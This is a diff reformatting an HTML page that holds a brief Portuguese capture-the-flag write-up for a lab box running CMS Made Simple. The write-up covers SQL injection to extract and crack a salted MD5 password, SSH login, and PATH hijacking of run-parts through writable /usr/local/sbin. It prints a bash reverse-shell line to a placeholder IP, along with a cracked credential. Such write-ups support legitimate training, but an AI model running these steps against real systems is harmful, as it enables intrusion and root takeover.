@@ -15,24 +15,24 @@
 </header>
 <div class ="container">
 	<section id="writeup">
-    <p>enumera&ccedil;&atilde;o com dirb &eacute; impossivel<br />
-    checagem padrao robots.txt<br />
-    dir /writeup<br />
-    com wappalyzer da pra ver que usa CMS Made Simple<br />
-    procura exploit pra isso e da pra ver que existe um exploit sql injection<br />
-    extrai salt, usuario, email e senha formato md5<br />
-    joga no https://hashtoolkit.com/decrypt-md5-hash/ceb20772e0c9d240c75eb26b0e37abe<br />
-    vai quebrar o hash e da pra ver o salt no come&ccedil;o<br />
-    senha raykayjay9<br />
-    loga ssh, executa o pspy e fica olhando os processos<br />
-    quando alguem loga ssh o run-parts &eacute; executado, mas ele olha em diversos diretorios em busca do binario<br />
-    o primeiro deles /usr/local/sbin temos direito de escrita<br />
-    faz um scriptzinho <br />
-    #/bin/bash <br />
-    bash -i >&amp; /dev/tcp/meuip/porta 0>&amp;1<br />
-    e faz um link do script como /usr/local/sbin/run-parts<br />
-    abre um nc modo listen em outro terminal<br />
-    loga ssh como user, e rooted<br />
-    </p>
+	    <p>enumeração com dirb é impossivel </p>
+	    <p>checagem padrao robots.txt</p>
+	    <p>dir /writeup</p>
+	    <p>com wappalyzer da pra ver que usa CMS Made Simple</p>
+	    <p>procura exploit pra isso e da pra ver que existe um exploit sql injection</p>
+	    <p>extrai salt, usuario, email e senha formato md5</p>
+	    <p>joga no https://hashtoolkit.com/decrypt-md5-hash/ceb20772e0c9d240c75eb26b0e37abe</p>
+	    <p>vai quebrar o hash e da pra ver o salt no começo</p>
+	    <p>senha raykayjay9</p>
+	    <p>loga ssh, executa o pspy e fica olhando os processos</p>
+	    <p>quando alguem loga ssh o run-parts é executado, mas ele olha em diversos diretorios em busca do binario</p>
+	    <p>o primeiro deles /usr/local/sbin temos direito de escrita</p>
+	    <p>fz um scriptzinho</p>
+	    <p>#/bin/bash</p>
+	    <p>bash -i >&amp; /dev/tcp/meuip/porta 0>&amp;1</p>
+	    <p>e faz um link do script como /usr/local/sbin/run-parts</p>
+	    <p>abre um nc modo listen em outro terminal</p>
+	    <p>loga ssh como user, e rooted</p>
+	    
 </body>
 </html>
